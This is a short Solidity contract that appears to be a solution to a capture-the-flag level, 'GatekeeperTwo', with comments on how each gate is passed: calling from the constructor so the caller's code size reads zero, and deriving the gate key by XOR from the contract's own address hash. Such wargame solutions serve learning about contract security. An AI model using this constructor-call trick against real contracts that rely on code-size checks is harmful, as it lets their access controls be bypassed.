// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackGateKeeperTwo {
    constructor(address _gateKeeperTwo) {
        // gateTwo: If the call to GateKeeper happens in the constructor then the contract is not initilazed at the tx of the actual call
        // Thus at gateTwo x := extcodesize(caller()) will evaluate to x = 0

        // gateTthree: the statement means => a XOR b = c => a XOR c = b
        // And in this case the msg.sender used should be the address of this contracts
        bytes8 gateThreeKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        ); // rewrite for solidity ^0.8.0

        //  gateOne: this contract is calling so msg.sender != tx.origin
        _gateKeeperTwo.call(
            abi.encodeWithSignature("enter(bytes8)", gateThreeKey)
        );
    }
}
